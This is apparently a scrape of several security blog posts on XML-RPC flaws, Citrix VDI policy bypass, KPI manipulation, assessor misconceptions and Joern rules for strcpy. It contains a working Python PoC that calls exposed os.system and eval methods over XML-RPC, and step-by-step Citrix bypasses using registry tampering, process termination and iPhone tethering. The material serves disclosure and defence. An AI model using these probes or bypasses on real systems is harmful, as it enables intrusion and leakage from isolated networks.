XML-RPC, enhancing input validation, reinforcing authentication systems, applying up-to-date security patches, implementing access control, and deploying WAFs. What is XML-RPC? XML-RPC (XML Remote Procedure Call) is a remote procedure call protocol that uses XML as its data format and HTTP as its transport mechanism. Proposed jointly by Dave Winer and Microsoft in 1998, it was designed to simplify cross-platform communication.\nBasic Principles The client sends a request in XML format, and the server responds in XML. It can easily pass through firewalls using standard HTTP(S). History of XML-RPC XML-RPC was widely used in early web services and implemented in various languages including Perl, Java, Python, C, and PHP. Although it later evolved into SOAP, it is still used in some environments due to its simplicity.\nCurrent Status of XML-RPC Its use is declining with the advent of newer technologies such as RESTful APIs and gRPC. WordPress is transitioning to REST API, and XML-RPC is now mostly limited to legacy systems.\nVulnerability Analysis 1. XML Injection \u0026amp; Remote Code Execution (RCE) NodeBB (CVE-2023-43187): RCE possible due to lack of XML input validation Apache OFBiz (CVE-2020-9496): RCE via Java deserialization PHP XML-RPC (CVE-2005-1921): RCE through misuse of eval() 2. XXE (XML External Entity) Apache XML-RPC (CVE-2016-5002): Local file exposure and SSRF possible due to missing external entity deactivation 3. DDoS and Brute Force Attacks system.multicall: Automates brute force attacks pingback.ping: Facilitates DDoS reflection attacks 4. Authentication Bypass \u0026amp; Privilege Escalation WordPress (CVE-2020-28036): Authentication bypass via XML-RPC Real-World Attack Cases SonicWall Report (2018): Over 100,000 XML-RPC attacks detected WPbrutebot: XML-RPC-based brute-force attack tool Pingback DDoS: Large-scale reflection attacks using XML-RPC XML-RPC Exploit Example The following is a Python-based PoC code to detect RCE vulnerabilities in XML-RPC and its execution screen:\nimport xmlrpc.client import ssl import http.client candidate_methods = [ \u0026#34;os.system\u0026#34;, \u0026#34;commands.getoutput\u0026#34;, \u0026#34;subprocess.check_output\u0026#34;, ] candidate_methods_eval = [ \u0026#34;__builtin__.eval\u0026#34;, \u0026#34;builtins.eval\u0026#34;, ] rpc_urls = [ \u0026#34;https://xxx.com/cgi-bin/rpc.cgi\u0026#34;, ] context = ssl._create_unverified_context() class UnverifiedTransport(xmlrpc.client.SafeTransport): def make_connection(self, host): return http.client.HTTPSConnection(host, context=context) for rpc_url in rpc_urls: print(f\u0026#34;[+] Scanning target: {rpc_url}\u0026#34;) client = xmlrpc.client.ServerProxy(rpc_url, transport=UnverifiedTransport()) for method in candidate_methods: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;id\u0026#39;)...\u0026#34;) result = func(\u0026#39;id\u0026#39;) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[‚úî] {method} ‚Üí Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) for method in candidate_methods_eval: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) payload = \u0026#39;__import__(\u0026#34;commands\u0026#34;).getoutput(\u0026#34;id\u0026#34;)\u0026#39; print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;{payload}\u0026#39;)...\u0026#34;) result = func(payload) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[‚úî] {method} ‚Üí Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) ‚ö†Ô∏è Use this script only in authorized environments.\nMajor Services Using XML-RPC System Usage Examples WordPress Posting, comments, pingbacks (moving to REST) Bugzilla Bug submission and update API ManageEngine User account and password management Apache OFBiz ERP integration API Security Hardening Measures Disable XML-RPC (via .htaccess, web server config, plugins) Enhance input validation (regex-based) Apply XXE prevention settings Use API keys, OAuth, JWT authentication Restrict access by IP Deploy Web Application Firewall (WAF) Monitor logs and conduct regular vulnerability assessments Modern Alternatives Comparison Criteria XML-RPC REST GraphQL Data Format XML JSON JSON Structure Method-based Resource-based Query-based Scalability Low High Very High Security Low Medium+ Medium+ Strengths Simple implementation Cacheable Minimized data queries Conclusion \u0026amp; Recommendations Avoid using XML-RPC due to high security risks. If unavoidable, apply strong authentication and access control. Actively consider migrating to REST or GraphQL. Reference Links XML-RPC - Wikipedia CVE-2023-43187 - NodeBB XML Injection CVE-2020-9496 - Apache OFBiz RCE CVE-2005-1921 - PHP XMLRPC Code Injection CVE-2016-5002 - Apache XML-RPC XXE WordPress XML-RPC Security Guide (SolidWP) SonicWall XML-RPC Attack Analysis Report ","permalink":"https://windshock.github.io/en/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/","summary":"\u003cp\u003e\u003cstrong\u003eXML-RPC Security Series:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://windshock.github.io/en/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/\"\u003eSeries 1 - XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://windshock.github.io/en/post/2025-04-24-cve-2019-17570-apache-xmlrpc/\"\u003eSeries 2 - CVE-2019-17570: Apache XML-RPC Exploit\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://windshock.github.io/en/post/2025-05-30-rce-via-exception-serialization-in-openstack-nova/\"\u003eSeries 3 - Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"XML-RPC background\" loading=\"lazy\" src=\"/images/post/xmlrpc-security.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOverview of XML-RPC Vulnerabilities:\u003c/strong\u003e As a lightweight remote call protocol for inter-system communication, XML-RPC is exposed to various threats such as RCE, XXE, DDoS, and privilege escalation.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNotable Cases:\u003c/strong\u003e NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921), etc.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReal-World Use Cases:\u003c/strong\u003e In addition to WordPress, Bugzilla, ManageEngine, and Apache OFBiz, XML-RPC is still used in some legacy systems.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation Strategies:\u003c/strong\u003e Disabling XML-RPC, enhancing input validation, reinforcing authentication systems, applying up-to-date security patches, implementing access control, and deploying WAFs.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-xml-rpc\"\u003eWhat is XML-RPC?\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eXML-RPC (XML Remote Procedure Call)\u003c/strong\u003e is a remote procedure call protocol that uses XML as its data format and HTTP as its transport mechanism. Proposed jointly by Dave Winer and Microsoft in 1998, it was designed to simplify cross-platform communication.\u003c/p\u003e","title":"XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies"},{"content":"Review of Citrix Security Policy Effectiveness 1. Introduction Citrix administrators apply security policies to each user‚Äôs VDI (Virtual Desktop Infrastructure) through Citrix Group Policy. However, certain structural vulnerabilities in Citrix CSE (Citrix Service Engine) and the Citrix VDI Agent allow for potential bypassing of these security policies.\n2. Security Policy Bypass Bypass through Registry Manipulation A security policy bypass is possible by manipulating the registry using a race condition that occurs during the Citrix VDI Agent (PicaSvc2.exe) policy storage process. While Citrix has implemented a stealth patch to mitigate this vulnerability, it is still possible to disable security policies by adjusting registry security settings and denying write permissions.\nForced Termination of CSE If the Citrix CSE (Citrix Service Engine) is forcibly terminated or deleted, security policies are not applied, potentially allowing unauthorized access to restricted resources.\nGPF File Manipulation Attempting to bypass security policies by modifying the GPF (Group Policy File) or limiting its permissions is possible, though this method is unstable and has several limitations.\n3. Bypass via Registry Modification and Write Permission Denial When a user logs in with a standard account (e.g., User A), Citrix Security Policy settings are created in the registry based on the Windows session ID. Citrix\u0026rsquo;s tendency to prioritize usability over security allows security policies to be bypassed by modifying the registry settings (CdmPolicies, IO, VCPolicies) and denying write permissions for all users. This enables bypassing security policies upon reconnection.\nIn test environments, automatic logout is triggered if the Citrix security policy registry settings are altered and permissions are restricted. By modifying values such as ClearPassword, Domain, and LogonTicket in the ICA file to arbitrary values (e.g., ‚Äútest‚Äù), local accounts can bypass this automatic logout.\nFurthermore, logging in with a local secondary account bypasses forced logout restrictions. Although Citrix limits multi-login sessions, it is possible to complete login by pressing Ctrl-Alt-Del, launching the Task Manager, and terminating the PicaSessionAgent.exe process.\nFinally, logging in with a local account (e.g., \u0026ldquo;windshock\u0026rdquo;) allows use of Citrix VDI without Citrix‚Äôs security policies, as they are bypassed in Windows Session 1.\n4. Conclusion Citrix‚Äôs approach to applying security policies seems to prioritize usability, which may enhance user accessibility but also introduces a structural vulnerability that could facilitate policy bypass. Organizations using Citrix should recognize these potential security bypasses and implement additional internal monitoring or alert systems to enable administrators to respond in real-time.\nFurthermore, if Citrix were to enforce security policies at a lower system level, such as the Xen Hypervisor, this could help maintain a balance between security and usability while effectively preventing bypass attempts. This would ensure that organizations can achieve both the required security and the accessibility Citrix offers.\nReferences Citrix Group Policy Troubleshooting for XenApp and XenDesktop Bypassing Citrix Policy Is Not A Vulnerability, But It Can Be A Violation Of The Law ","permalink":"https://windshock.github.io/en/post/2024-11-05-review-of-citrix-security-policy-effectiveness/","summary":"\u003ch1 id=\"review-of-citrix-security-policy-effectiveness\"\u003eReview of Citrix Security Policy Effectiveness\u003c/h1\u003e\n\u003ch2 id=\"1-introduction\"\u003e1. Introduction\u003c/h2\u003e\n\u003cp\u003eCitrix administrators apply security policies to each user‚Äôs VDI (Virtual Desktop Infrastructure) through Citrix Group Policy. However, certain structural vulnerabilities in Citrix CSE (Citrix Service Engine) and the Citrix VDI Agent allow for potential bypassing of these security policies.\u003c/p\u003e\n\u003ch2 id=\"2-security-policy-bypass\"\u003e2. Security Policy Bypass\u003c/h2\u003e\n\u003ch3 id=\"bypass-through-registry-manipulation\"\u003eBypass through Registry Manipulation\u003c/h3\u003e\n\u003cp\u003eA security policy bypass is possible by manipulating the registry using a race condition that occurs during the Citrix VDI Agent (PicaSvc2.exe) policy storage process. While Citrix has implemented a stealth patch to mitigate this vulnerability, it is still possible to disable security policies by adjusting registry security settings and denying write permissions.\u003c/p\u003e","title":"Review of Citrix Security Policy Effectiveness"},{"content":"KPIs Can Cause Incidents!!! - Bad metrics produce bad outcomes. Recently, I was going through old emails and found a reply from a junior colleague to a very serious email I had sent. The colleague wrote that after reading my message, they realized they had been mindlessly following instructions without deeper consideration. They promised to carefully consider the ethical implications and correctness of every task, and to proceed based on their own judgment going forward.\nUpon further investigation, I realized this colleague managed our vulnerability tracking system. They had been instructed by their team leader to uniformly downgrade the severity ratings of high-risk vulnerabilities. My email had warned them about the potential ethical problems associated with such actions. (Although much time has passed and things have changed, this colleague was very sincere at that time\u0026hellip;)\nSeveral years ago, around the year-end performance evaluation period, a team leader tried to artificially boost KPIs related to vulnerability remediation‚Äîmetrics difficult to control directly. This unethical action made me curious about the potential negative impacts.\nAfter reviewing past vulnerability assessments and incident records, I discovered actual examples where manipulated KPIs led to cybersecurity incidents. Although specifics can\u0026rsquo;t be disclosed due to security reasons, news articles such as \u0026ldquo;[Exclusive] Hacker Redirected Bank SMS Authentication Codes, Bitcoin Accounts Emptied\u0026rdquo; indirectly reported these issues. (Call-forwarding wasn\u0026rsquo;t the only possible method used by attackers.)\nWithout KPI pressures, staff would have operated normally, potentially preventing these incidents. However, in modern organizational structures, KPIs cannot simply be removed.\nWas the problem the way KPIs were structured? Evaluators naturally prefer result-oriented metrics‚Äîeither incidents or vulnerabilities prevented‚Äîwhich limits alternative approaches.\nWas the KPI management process too loose? Would tighter controls and more frequent feedback have prevented this issue? Actually, at that time, we had already formed a dedicated task force that regularly provided feedback on vulnerability risk ratings.\nUltimately, over time, I\u0026rsquo;ve realized KPIs for evaluating leaders have become largely ceremonial. Peter Drucker famously said, \u0026ldquo;You can\u0026rsquo;t manage what you can\u0026rsquo;t measure.\u0026rdquo; However, in organizations created and managed by humans, purely mechanical evaluation was flawed from the start and susceptible to manipulation by human desires.\nCan we truly manage organizations effectively through metrics alone? Can businesses prioritize essence over appearance?\nWorks Cited \u0026ldquo;[Exclusive] Hacker Redirected Bank SMS Authentication Codes, Bitcoin Accounts Emptied.\u0026rdquo; Yonhap News Agency, December 3, 2017. https://www.yna.co.kr/view/MYH20171203004600038. (Accessed June 16, 2024)\n\u0026ldquo;Bad metrics produce bad outcomes.\u0026rdquo; JoongAng Ilbo, March 5, 2017. https://www.joongang.co.kr/article/21337981#home.\n","permalink":"https://windshock.github.io/en/post/2024-06-20-kpi-causes-accidents/","summary":"\u003ch2 id=\"kpis-can-cause-incidents---bad-metrics-produce-bad-outcomes\"\u003eKPIs Can Cause Incidents!!! - Bad metrics produce bad outcomes.\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"KPIs Incidents Toon\" loading=\"lazy\" src=\"/images/post/kpis_incidents.webp\"\u003e\u003c/p\u003e\n\u003cp\u003eRecently, I was going through old emails and found a reply from a junior colleague to a very serious email I had sent. The colleague wrote that after reading my message, they realized they had been mindlessly following instructions without deeper consideration. They promised to carefully consider the ethical implications and correctness of every task, and to proceed based on their own judgment going forward.\u003c/p\u003e","title":"KPIs Can Cause Incidents!!!"},{"content":"Common Misconceptions of Security Assessors Inefficient Vulnerability Evaluation Structure and Response Methods Introduction As the cybersecurity landscape constantly evolves, vulnerability assessment has become a critical defense against potential security breaches. However, due to common misconceptions, the effectiveness of these evaluations often diminishes. In this article, we will explore the common misconceptions about security vulnerability assessments and suggest effective strategies to overcome these issues, ultimately supporting the improvement of organizational security levels.\nCommon Misconceptions About Security Vulnerability Assessments 1. The Belief That All Vulnerabilities Must Be Found Among security vulnerability assessors, there is a widespread belief that all vulnerabilities must be identified. This reflects a failure to understand the limitations of human assessors. According to a study by Tyma et al. (2019)[1], despite extensive efforts, only a few vulnerabilities were discovered.\nAdditionally, there are instances where outsiders who analyze vulnerabilities without the company\u0026rsquo;s approval are met with an exclusionary attitude. These limited perceptions can lead to frustration and dissatisfaction among assessors.\n2. An Overblown Perception of the Security Assessor\u0026rsquo;s Capabilities Security assessors often mistake the idea that they must find every vulnerability and tend to become upset when vulnerabilities they did not discover are reported. To overcome this, it\u0026rsquo;s crucial to recognize the limitations of security assessors and actively use external resources (such as external experts and bug bounty programs)[2] to manage vulnerabilities systematically.\n3. The Misconception That Providing Detailed Descriptions of Vulnerabilities Will Solve the Problem Many believe that providing developers with detailed information about vulnerabilities will completely resolve security issues. However, as seen in the OWASP Top 10[3], even with detailed understanding, basic security issues continue to arise. This is a structural problem that cannot be solved by vulnerability information alone.\nStrategies for Effective Vulnerability Assessment 1. Designing a Repeatable Structure Assessment methods that rely solely on the experience or skills of assessors lack consistency and objectivity. A tool-based approach, systematic checklists, and the introduction of automated analysis should be used o create a repeatable evaluation structure.\n2. Actively Using External Resources Bug bounty programs, external expert groups, and voluntary reports from the community should be actively integrated into security organizations to supplement the limitations of existing approaches.(Shostack, 2014)[4]\n3. Improving Organizational Structure and Changing Perceptions Cultural shifts are necessary to overcome KPI-driven mindsets, performance-based evaluation systems, and negative perceptions about vulnerability reporting. Evaluators should be seen as problem solvers who guide improvements rather than just identifying issues.(Ferrante \u0026amp; Canali, 2012)[5].\nConclusion Security vulnerability assessment is not merely about finding vulnerabilities but is a process to systematically improve an organization\u0026rsquo;s security level. Misconceptions and inefficient structures can undermine the effectiveness of evaluations, and overcoming these requires a repeatable structure, active use of external resources, and a shift in organizational perception.\nIt is time for us to reflect on how much we have built security performance on flawed metrics.\nWorks Cited\nTyma, G. et al. (2019). \u0026ldquo;Limitations of Human Vulnerability Assessors: A Comparative Study.\u0026rdquo; Proceedings of the 34th Annual Computer Security Applications Conference. Whitman, M. E., \u0026amp; Mattord, H. J. (2016). Principles of Information Security. Cengage Learning. OWASP. (2021). \u0026ldquo;OWASP Top 10.\u0026rdquo; The Open Web Application Security Project. Shostack, A. (2014). Threat Modeling: Designing for Security. Wiley. Ferrante, A., \u0026amp; Canali, C. (2012). \u0026ldquo;A Systematic Approach to the Assessment of Security Vulnerabilities.\u0026rdquo; Journal of Information Security and Applications, 17(6), 318-329. ","permalink":"https://windshock.github.io/en/post/2024-06-16-common-misconceptions-of-security-assessors/","summary":"As the cybersecurity landscape constantly evolves, vulnerability assessment has become a critical defense against potential security breaches. However, due to common misconceptions, the effectiveness of these evaluations often diminishes. In this article, we will explore the common misconceptions about security vulnerability assessments and suggest effective strategies to overcome these issues, ultimately supporting the improvement of organizational security levels.","title":"Common Misconceptions of Security Assessors"},{"content":"Can Development Culture Influence Security Levels? Evaluating Code Quality and Security Levels Using Static Analysis Tools (Joern) Background Unlike companies like Google with an open and collaborative development culture, in some organizations that lack such culture, the quality of the code, including security levels, can be heavily influenced by the individual‚Äôs capability. In particular, developers who tend to write poor quality code, such as using the strcpy function, can have their code quality and security levels assessed by utilizing static analysis tools (Joern, CodeQL, etc.) with custom rules. As a result, even in situations where the development culture is lacking, code quality and security levels can be improved, leading to the production of good-quality code.\nGoogle\u0026rsquo;s Development Culture At Google, the Google C++ Style Guide is used to write and manage C++ code. The way this is applied at the organizational level is as follows:\nOrganizational Culture: Google has an open and collaborative organizational culture. This culture encourages developers to collaborate, share knowledge, review each other‚Äôs code, and provide feedback. This helps maintain coding style guidelines and improves the quality of code. Training and Education: Google trains new developers on how to adhere to coding style guidelines and apply them in their actual work. This helps developers understand the coding style guidelines and apply them in their work. Tools and Resources Provided: Google provides developers with tools and resources needed to comply with coding style guidelines. For example, tools like cpplint are provided to automatically check whether code complies with the style guide. Through this approach, Google applies coding style guidelines at the organizational level, which helps maintain code consistency and improve code quality. For further reading, check the Google Style Guide and the C++ Core Guidelines by the C++ Standards Committee.\nOrganizations Without Development Culture In contrast, some organizations lack a strong development culture that encourages collaboration and adherence to coding standards. This is particularly true for companies that frequently outsource development and have frequent changes in outsourcing partners. In these scenarios, inconsistent practices, varying skill levels between developers, and a lack of cohesive standards can lead to deteriorating code quality, including security levels. Consequently, these organizations face higher risks due to security vulnerabilities and subpar code quality.\nRisks of the strcpy Function The strcpy function is used to copy strings. However, the main issue with this function is that it does not check memory boundaries. This means that if the original string\u0026rsquo;s size exceeds the size of the destination memory, a buffer overflow bug can occur. This may result in errors during program execution or cause the program to malfunction.\nTo resolve this issue, the C11 standard provides the strcpy_s function. The strcpy_s function was created to address the shortcomings of strcpy, and when using this function, the size of the destination memory must be specified as the second argument. This helps prevent buffer overflow issues.\nStatic Analysis Tools Using Joern, a comprehensive Code Property Graph (CPG) integrates syntax, control flow, and data flow into a unified structure, thoroughly detecting complex security vulnerabilities and code issues. Joern‚Äôs customizable queries allow precise vulnerability detection tailored to specific project needs, and its scalability enables efficient analysis of large codebases. The tool\u0026rsquo;s functionality automates and integrates various stages of the development lifecycle, helping detect issues early and improve overall code quality. Joern supports multiple programming languages, making it versatile for various development environments.\nHowever, it is not necessary to use Joern exclusively. Similar tools like CodeQL and Checkmarx also provide powerful static analysis capabilities. For more details, refer to the Joern Documentation and related materials on graph databases and code analysis techniques.\nCustom Rule Examples Category Good (Security Level: High, Code Quality: High) Normal (Security Level: Low, Code Quality: Low) Bad (Security Level: Critical, Code Quality: Low) Description Input validation must always be performed. Input size should always be checked, or functions that check input size (such as strncpy, strlcpy, strcpy_s) should be used instead. Input size is checked, but dangerous functions are still used. Developers may be vulnerable to exceptional cases where input size is misunderstood for data types. Failing to check input size before buffer copy (\u0026lsquo;Traditional Buffer Overflow\u0026rsquo;). This can lead to critical security vulnerabilities, such as privilege escalation and unintended command execution. Case strlen_malloc_strncpy ZIP_EXTERN zip_int64_t zip_add_dir(struct‚ÄØzip *za,‚ÄØconst‚ÄØchar‚ÄØ*name) { size_t‚ÄØMAXSIZE = 1024; char* sInput = (char*)malloc(MAXSIZE); memset(sInput, 0, MAXSIZE); \u0026hellip; \u0026hellip; const‚ÄØjbyte* javaStr; jint result = -1; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, NULL); if(javaStr == NULL) goto‚ÄØend; strncpy(sInput, javaStr, MAXSIZE); \u0026hellip;\u0026hellip; \u0026hellip;\u0026hellip; } strlen_malloc_strcpy ZIP_EXTERN zip_int64_t zip_add_dir(struct‚ÄØzip *za,‚ÄØconst‚ÄØchar‚ÄØ*name) { int‚ÄØlen; char‚ÄØ*s; \u0026hellip;\u0026hellip; s = NULL; len =‚ÄØstrlen(name); if‚ÄØ(name[len-1] !=‚ÄØ\u0026lsquo;/\u0026rsquo;) { if‚ÄØ((s=(char‚ÄØ*)malloc(len+2)) == NULL) { _zip_error_set(\u0026amp;za-\u0026gt;error, ZIP_ER_MEMORY, 0); return‚ÄØ-1; }‚ÄØstrcpy(s, name); \u0026hellip;\u0026hellip; } malloc(Ï†ïÏàò)_strcpy Java_com_skt_skaf_OA00050017_engine_ComicEngineJNI_Open (JNIEnv* env, drmFileName, \u0026hellip;\u0026hellip;) { char* sInput = (char*)malloc(1024); \u0026hellip;\u0026hellip; const‚ÄØjbyte* javaStr; \u0026hellip;\u0026hellip; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, ((void*)0)); \u0026hellip;\u0026hellip; strcpy(sInput, javaStr); \u0026hellip;\u0026hellip; } Source/ Sink Source : * Sink :‚ÄØstrncpy, strlcpy, strcpy_s Source : * Sink : strcpy, strcat, sprintf, vsprintf, gets Source : GetStringUTFChars Sink : strcpy, strcat, sprintf, vsprintf, gets Pattern The parameter for malloc is an additive expression, and its data flow has strlen preceding it and strcpy following it. The parameter for malloc is an additive expression, and its data flow has strlen preceding it and strcpy following it. The malloc parameter takes an integer input, and the data flow uses strcpy. Known functions with no length limit (such as GetStringUTFChars) are used as the input to strcpy. Rule echo‚ÄØ\u0026quot;‚ÄØ\\ getCallsTo(\u0026lsquo;malloc\u0026rsquo;)‚ÄØ\\ .ithArguments(\u0026lsquo;0\u0026rsquo;).children().has(\u0026rsquo;type\u0026rsquo;,\u0026lsquo;AdditiveExpression\u0026rsquo;).statements()‚ÄØ\\ .or(‚ÄØ\\ __.in(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;))‚ÄØ\\ .out(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*malloc.*\u0026rsquo;)),‚ÄØ\\ __.has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;))‚ÄØ\\ ).out(\u0026lsquo;REACHES\u0026rsquo;)‚ÄØ\\ .has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*strncpy.* .*strlcpys.* .*strcpy_s.*\u0026rsquo;))‚ÄØ\\ .id()\u0026quot; Ï∞∏Í≥† https://randomascii.wordpress.com/2013/04/03/stop-using-strncpy-already/ https://www.cse.psu.edu/~gxt29/papers/jdksecurity.pdf ","permalink":"https://windshock.github.io/en/post/2024-05-22-can-development-culture-influence-security-levels/","summary":"\u003ch1 id=\"can-development-culture-influence-security-levels\"\u003eCan Development Culture Influence Security Levels?\u003c/h1\u003e\n\u003cp\u003e\u003cimg alt=\"Development Culture\" loading=\"lazy\" src=\"/images/post/development-culture.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"evaluating-code-quality-and-security-levels-using-static-analysis-tools-joern\"\u003eEvaluating Code Quality and Security Levels Using Static Analysis Tools (Joern)\u003c/h2\u003e\n\u003ch3 id=\"background\"\u003eBackground\u003c/h3\u003e\n\u003cp\u003eUnlike companies like \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#google-development-culture\"\u003eGoogle\u003c/a\u003e with an open and collaborative development culture, in some organizations that lack such culture, the quality of the code, including security levels, can be heavily influenced by the individual‚Äôs capability. In particular, developers who tend to write poor quality code, such as using the \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#strcpy-function-risk\"\u003estrcpy function\u003c/a\u003e, can have their code quality and security levels assessed by utilizing \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#static-analysis-tools\"\u003estatic analysis tools\u003c/a\u003e (Joern, CodeQL, etc.) with \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#custom-rule-examples\"\u003ecustom rules\u003c/a\u003e. As a result, even in situations where the development culture is lacking, code quality and security levels can be improved, leading to the production of good-quality code.\u003c/p\u003e","title":"Can Development Culture Influence Security Levels?"},{"content":"Bypassing Citrix Policy is Not a Vulnerability but a Legal Violation Note!! Based on discussions with Citrix through VINCE from cert.org, it was concluded that this is not classified as a vulnerability because it requires administrative privileges. Therefore, I can share this information without security concerns. However, for security reasons, I do not recommend using Xendesktop (VDI) in special environments such as logically isolated or closed networks. If VDI must be used in such environments, please ensure that administrator privileges are removed and security-specific software is installed.\nWhile the need for administrative privileges may reduce the risk, it does not eliminate the potential impact. Below is a detailed technical explanation of how the Citrix policy can be bypassed.\nDescription The Citrix VDI Agent (PicaSvc2.exe) seems to follow a structure where it receives policies from the Citrix management server, records them in the registry (HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User), and applies these policies by reading from the registry. An attacker can bypass security policies for drives, network access, clipboard operations, etc., enforced by the Citrix Policy Server through manipulation of the registry (refer to the proof of concept [POC] below).\nAccording to Citrix\u0026rsquo;s Common Criteria Certification documentation, protections are designed to prevent an attacker from altering this configuration data (Configdata). This type of bypass could be considered an implementation flaw.\nIf VDI is used in closed or isolated network environments, bypassing Citrix Policy and forcibly connecting the VDI to the internet could expose sensitive internal information to external parties. In South Korea, such actions are a clear violation of the law and would require a reassessment of network isolation measures.\nProof of Concept (POC) An attacker would first need to log into the company\u0026rsquo;s Citrix VDI (running Windows 10) after gaining access to the company‚Äôs account. The VDI environment is typically restricted from network access, printer use, external drives, clipboard access, etc.\nThe attacker logs into the VDI and runs a batch file (download link) that continuously modifies the registry, then disconnects from the VDI session.\nAfter running the batch file to modify the registry, the attacker disconnects from the VDI. Upon reconnection, the registry values have been tampered with, allowing the attacker to bypass Citrix policies.\nExample registry modification:\nWindows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User] \u0026#34;AutoConnectDrives\u0026#34;=dword:00000001 \u0026#34;AllowCdromDrives\u0026#34;=dword:00000001 \u0026#34;AllowFixedDrives\u0026#34;=dword:00000001 \u0026#34;AllowFloppyDrives\u0026#34;=dword:00000001 \u0026#34;AllowNetworkDrives\u0026#34;=dword:00000001 \u0026#34;AllowRemoveableDrives\u0026#34;=dword:00000001 \u0026#34;UseAsyncWrites\u0026#34;=dword:00000001 \u0026#34;ReadOnlyMappedDrive\u0026#34;=dword:00000000 Upon logging back into the VDI, PicaSvc2.exe retrieves the policy settings from the Citrix server and stores them in the registry.\nWhile PicaSvc2.exe is writing and reading policies, the registry values have already been tampered with by the previously executed batch file.\nPicaSvc2.exe then applies the manipulated policies in the VDI environment.\nAdditionally:\nBy modifying the registry of the connecting PC, hardware redirection can be enabled, which allows unauthorized network access. Citrix\u0026rsquo;s default policy allows USB class FFh, which means an iPhone can be used for tethering or a USB-based wireless card could be used to bypass network isolation. To enable iPhone tethering, the attacker would need to install drivers extracted from the iTunes installer: Apple network driver and Apple USB driver. After redirecting the iPhone in the Citrix session, internet access can be obtained even in a network-isolated environment. Impact For companies using VDI to maintain logical network separation, this vulnerability could lead to the leakage of internal information and unauthorized access to internal servers.\nGiven the potential impact, it is crucial to identify and mitigate such attacks in real-time. Below are steps to discover and monitor potential bypass activities.\nDiscovery To discover this issue:\nUse Procmon to monitor the operations of PicaSvc2.exe. Examine the registry keys where the Citrix agent stores its policy settings. Manipulate and observe the effects of changes in these registry values. Design Analysis The Citrix Common Criteria Certification document includes measures to prevent unauthorized modification of configuration data. According to Citrix\u0026rsquo;s Common Criteria Certification Information, the integrity and confidentiality of the data required for setup and assignment of a virtual desktop or application are maintained during transmission between servers. This design also includes prevention measures against attackers, application users, or desktop users from modifying the configuration data.\nDespite Citrix\u0026rsquo;s implementation of security features as outlined above, legal considerations must also be addressed, particularly in regions like South Korea where strict network isolation laws apply.\nCitrix‚Äôs security objectives, including O.Secure_Setup_Data, OE.TLS, and OE.Encryption, ensure the confidentiality and integrity of the configuration data during processing and transmission between servers.\nFor more details on the security objectives and the roles of management functions, see:\nFMT_SMF.1/Authorise: Management of the endpoint data access control policy FMT_MSA.1/Desktop FMT_MSA.3/Desktop FMT_MSA.1/Application FMT_MSA.3/Application FPT_ITT.1 Legal Considerations In South Korea, the Financial Supervisory Service (FSS) has introduced measures under the Electronic Financial Transactions Act that provide companies with the option of implementing logical network separation. Financial institutions are required to block unauthorized access and prevent incidents by adopting network isolation measures to protect sensitive data from external attacks.\nSince the attack requires administrative privileges, companies should review their policy regarding the removal of administrative privileges for PC users in logically separated network environments. Furthermore, there is a need for legal improvements to include regulations that prevent the misuse of these systems.\nLimitation Even with administrative and installation privileges restricted, it is still difficult to fully prevent data leaks through methods such as capturing screen images. More detailed analysis and solutions regarding logical network isolation models can be found in this report.\nThese limitations suggest that even with administrator rights removed, organizations remain vulnerable. This highlights the importance of addressing these issues at both a technical and regulatory level, as seen in recent banking sector responses to similar incidents.\nRelated Issues Following a 2011 hacking incident at Nonghyup, several major banks in South Korea began implementing internal-external network separation to prevent the leakage, theft, or tampering of personal information. Network isolation remains a key recommendation 